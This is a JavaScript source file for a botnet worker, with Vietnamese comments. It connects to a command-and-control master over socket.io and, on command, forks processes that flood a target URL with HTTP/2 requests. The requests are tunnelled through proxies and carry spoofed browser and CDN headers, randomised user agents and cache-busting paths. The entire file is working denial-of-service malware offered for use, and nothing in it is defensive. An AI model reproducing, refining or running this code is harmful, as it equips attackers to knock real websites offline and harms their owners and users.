// worker.js - Botnet Worker (dựa trên v1.74)
// node worker.js <master_domain>

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const io = require('socket.io-client');
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
const os = require('os');
const express = require('express');

// ==================== CONFIG ====================
const MASTER_DOMAIN = process.argv[2];
const HEALTH_PORT = process.env.PORT || 10000;

if (!MASTER_DOMAIN) {
    console.error('[!] Usage: node worker.js <master_domain>');
    console.error('[!] Example: node worker.js control-13.onrender.com');
    process.exit(1);
}

// ==================== LẤY IP THẬT ====================
function getLocalIP() {
    const nets = os.networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
            if (net.family === 'IPv4' && !net.internal) {
                return net.address;
            }
        }
    }
    return 'unknown';
}

// ==================== TẢI PROXY ====================
let proxies = ['direct'];
try {
    if (fs.existsSync('./proxy.txt')) {
        proxies = fs.readFileSync('./proxy.txt', 'utf-8')
            .split('\n')
            .filter(line => line.trim() && line.includes(':'));
        console.log(`[+] Loaded ${proxies.length} proxies`);
    }
} catch (e) {}

// ==================== TLS CONFIG (GIỐNG v1.74) ====================
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: "TLS_client_method"
});

// ==================== RANDOM ====================
function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomString(len) { return crypto.randomBytes(len).toString('hex').slice(0, len); }
function randomIP() { return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`; }

// ==================== USER-AGENTS (GIỐNG v1.74) ====================
const uap = [
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0 like Mac OS X) AppleWebKit/605.1.15 Version/20.0 Mobile/15E148 Safari/604.1'
];

// ==================== HEADER LISTS (GIỐNG v1.74) ====================
const accept_header = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
];

const encoding_header = [
    'gzip, deflate, br',
    'gzip, deflate'
];

const lang_header = [
    'en-US,en;q=0.9',
    'vi-VN,vi;q=0.9,en-US;q=0.8'
];

const cache_header = ['no-cache', 'max-age=0'];
const platform = ["Windows", "Macintosh", "Linux", "iPhone", "Android"];
const dest_header = ['document', 'empty', 'iframe', 'image'];
const mode_header = ['navigate', 'cors', 'no-cors'];
const site_header = ['cross-site', 'same-origin', 'same-site', 'none'];

// ==================== HEALTH SERVER ====================
const healthApp = express();

healthApp.get('/', (req, res) => {
    res.send(`
        <html>
        <head><title>🤖 WORKER v1.74</title></head>
        <body>
            <h1>🤖 WORKER v1.74</h1>
            <p>IP: ${getLocalIP()}</p>
            <p>Master: ${MASTER_DOMAIN}</p>
            <p>Connection: ${socket && socket.connected ? '✅ CONNECTED' : '❌ DISCONNECTED'}</p>
            <p>Proxies: ${proxies.length}</p>
            <p>Uptime: ${Math.floor(process.uptime())}s</p>
        </body>
        </html>
    `);
});

healthApp.get('/health', (req, res) => {
    res.json({ status: 'ok', connected: socket ? socket.connected : false });
});

healthApp.listen(HEALTH_PORT, '0.0.0.0', () => {
    console.log(`[+] Health server running on port ${HEALTH_PORT}`);
});

// ==================== CLASS NetSocket (GIỐNG v1.74) ====================
class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true
        });

        connection.setTimeout(3000);
        connection.setKeepAlive(true, 30000);
        connection.setNoDelay(true);
        
        connection.on("connect", () => connection.write(buffer));
        connection.on("data", chunk => {
            if (chunk.toString().includes("HTTP/1.1 200")) 
                callback(connection);
            else {
                connection.destroy();
                callback(null);
            }
        });
        connection.on("timeout", () => {
            connection.destroy();
            callback(null);
        });
        connection.on("error", () => {
            connection.destroy();
            callback(null);
        });
    }
}

// ==================== ATTACK FUNCTION (GIỐNG v1.74) ====================
function runFlooder(target, rate) {
    // Dùng URL API mới
    const parsedTarget = new URL(target);
    let count = 0;
    
    // Stats interval
    const statsInterval = setInterval(() => {
        if (count > 0 && socket.connected) {
            socket.emit('stats', { count });
            count = 0;
        }
    }, 1000);
    
    function flood() {
        const proxyAddr = randomElement(proxies);
        if (proxyAddr === 'direct') {
            setTimeout(flood, 100);
            return;
        }
        
        const parsedProxy = proxyAddr.split(':');
        
        const headers = {
            ":method": "GET",
            ":path": parsedTarget.pathname + '?' + randomString(8),
            ":authority": parsedTarget.hostname,
            "accept": randomElement(accept_header),
            "accept-encoding": randomElement(encoding_header),
            "accept-language": randomElement(lang_header),
            "cache-control": randomElement(cache_header),
            "pragma": "no-cache",
            "referer": "https://www.google.com/",
            "sec-ch-ua": `"Chromium";v="150", "Google Chrome";v="150", "Not?A_Brand";v="99"`,
            "cf-cache-status": "DYNAMIC",
            "cdn-loop": "cloudflare",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": randomElement(platform),
            "sec-fetch-dest": randomElement(dest_header),
            "sec-fetch-mode": randomElement(mode_header),
            "sec-fetch-site": randomElement(site_header),
            "sec-fetch-user": "1",
            "upgrade-insecure-requests": "1",
            "user-agent": randomElement(uap),
            "x-forwarded-for": parsedProxy[0],
            "x-forwarded-proto": "https"
        };

        const Socker = new NetSocket();
        const proxyOptions = {
            host: parsedProxy[0],
            port: parseInt(parsedProxy[1]),
            address: parsedTarget.hostname + ":443",
            timeout: 100
        };

        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error || !connection) return;

            connection.setKeepAlive(true, 90000);
            connection.setNoDelay(true);

            const tlsOptions = {
                socket: connection,
                ALPNProtocols: ["h2", "http/1.1"],
                servername: parsedTarget.hostname,
                rejectUnauthorized: false,
                secureContext: secureContext
            };

            try {
                const tlsConn = tls.connect(443, parsedTarget.hostname, tlsOptions);

                tlsConn.setNoDelay(true);
                tlsConn.setKeepAlive(true, 60000);

                const client = http2.connect(parsedTarget.origin, {
                    createConnection: () => tlsConn,
                    settings: {
                        maxConcurrentStreams: 1000,
                        initialWindowSize: 6291456
                    }
                });

                client.on("connect", () => {
                    function sendBatch() {
                        for (let i = 0; i < rate; i++) {
                            try {
                                const request = client.request(headers);
                                request.on("error", () => {});
                                request.end();
                                count++;
                            } catch (e) {}
                        }
                        setImmediate(sendBatch);
                    }
                    sendBatch();
                });

                client.on("close", () => {
                    client.destroy();
                    connection.destroy();
                });

                client.on("error", () => {
                    client.destroy();
                    connection.destroy();
                });

            } catch (e) {
                connection.destroy();
            }
        });
        
        setImmediate(flood);
    }
    
    flood();
    
    return () => {
        clearInterval(statsInterval);
    };
}

// ==================== KẾT NỐI MASTER ====================
const masterUrl = `https://${MASTER_DOMAIN}`;
const socket = io(masterUrl, {
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 1000,
    transports: ['websocket', 'polling']
});

let currentCleanup = null;

socket.on('connect', () => {
    console.log(`[+] Connected to master at ${MASTER_DOMAIN}`);
    socket.emit('register', { ip: getLocalIP() });
});

socket.on('registered', (data) => {
    console.log(`[+] Registered. Total workers: ${data.workers}`);
});

socket.on('ping', () => {
    socket.emit('pong');
});

socket.on('attack', (data) => {
    console.log(`\n[+] ATTACK COMMAND RECEIVED`);
    console.log(`   Target: ${data.target}`);
    console.log(`   Time: ${data.time}s`);
    console.log(`   Rate: ${data.rate}`);
    console.log(`   Threads: ${data.threads}`);
    
    // Dừng attack cũ
    if (currentCleanup) {
        currentCleanup();
        currentCleanup = null;
    }
    
    // Fork workers theo số threads
    if (cluster.isMaster) {
        for (let i = 0; i < data.threads; i++) {
            cluster.fork();
        }
        
        setTimeout(() => {
            process.exit(0);
        }, data.time * 1000);
    } else {
        // Worker process thực hiện flood
        currentCleanup = runFlooder(data.target, data.rate);
    }
});

socket.on('stop', () => {
    console.log(`[+] STOP command received`);
    if (currentCleanup) {
        currentCleanup();
        currentCleanup = null;
    }
    process.exit(0);
});

socket.on('disconnect', () => {
    console.log(`[-] Disconnected from master`);
    setTimeout(() => process.exit(0), 5000);
});
